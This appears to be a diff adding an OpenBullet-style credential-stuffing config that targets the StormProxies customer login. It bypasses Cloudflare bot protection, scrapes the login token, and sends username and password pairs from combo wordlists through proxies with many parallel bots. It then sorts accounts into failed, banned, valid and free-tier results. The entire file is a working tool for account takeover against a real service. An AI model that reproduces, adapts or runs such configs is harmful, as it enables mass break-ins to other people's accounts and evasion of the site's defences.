@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "StormProxies",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-14T07:09:24.3719238-07:00",
+  "AdditionalInfo": "",
+  "Author": "Mrcl1450",
+  "Version": "1.2.7 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BYPASSCF "https://stormproxies.com/clients/login" "ozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "name=\"login_attempt_id\" value=\"" "\" />" -> VAR "token" 
+
+REQUEST POST "https://stormproxies.com/clients/member" 
+  CONTENT "amember_login=<USER>&amember_pass=<PASS>&login_attempt_id=<token>&=Login&amember_redirect_url=https%3A%2F%2Fstormproxies.com%2Fclients%2Fmember&=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://stormproxies.com" 
+  HEADER "referer: https://stormproxies.com/clients/login" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The user name or password is incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "before next login attempt" 
+  KEYCHAIN Success OR 
+    KEY "Your Membership Information" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You have no active subscriptions" 
+
